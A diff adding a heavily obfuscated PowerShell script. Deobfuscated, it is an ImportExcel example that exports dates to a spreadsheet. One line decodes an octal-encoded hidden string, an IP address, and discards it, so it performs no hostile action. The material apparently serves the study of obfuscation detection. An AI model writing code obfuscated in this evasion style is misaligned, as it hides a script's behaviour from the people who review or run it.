@@ -1,0 +1,14 @@
+.('Sv') b6P`d4 (  [TyPe]("{2}{1}{0}" -F't','r','ConvE')  ) ;  try {.('Impor'+'t-M'+'odul'+'e') $`p`SscriPTrOo`T\..\..\ImpO`Rt`ExcEL.`psd1} catch {throw ; return}
+
+
+${xLsOuRc`E`FI`lE} = "$env:TEMP\ImportExcelExample.xlsx"
+&('Wri'+'te-'+'V'+'erbose') -Verbose -Message  ('Sav'+'e '+'locat'+'i'+'o'+'n: '+"$xlSourcefile")
+&('R'+'e'+'move-Item') ${x`lsoUrCEF`ILe} -ErrorAction IGN`oRE
+( "$( SEt-ItEm 'vARIaBle:oFS'  '')  "+ [STRInG]( ("{12}{13}{14}{10}{17}{16}{8}{15}{6}{9}{0}{18}{2}{7}{4}{11}{1}{5}{3}" -f '1,','r62','62d61B71','1@47','6','j6','h56d62h','@56d','1d70d7','63@7','d','2','47','d151',',160','1','6','72x','56x')."SP`Lit"( ',j{xrB@hdY' ) | &('F'+'OR'+'eaCh-'+'objeCt') { (  ( .('Get'+'-'+'VA'+'riABle')  b6P`d4 -vaLu  )::"TO`iNT`16"( ([stRINg]${_} ), 8) -aS[Char])})+"$(sET  'oFs'  ' ' ) " )  |&('oU'+'t-NUl'+'L')
+
+.('.6hPGe'+'n'+'Dat'+'es'+'.ps1').RePlACe('6hP',[sTring][CHar]92) |
+    &('Export-'+'E'+'xce'+'l') ${xLSOuR`c`EfILe} -Show -AutoSize -ConditionalText $(
+        .('New-Co'+'ndi'+'tio'+'nalText') -ConditionalType tH`i`sWeeK
+    )
+
+
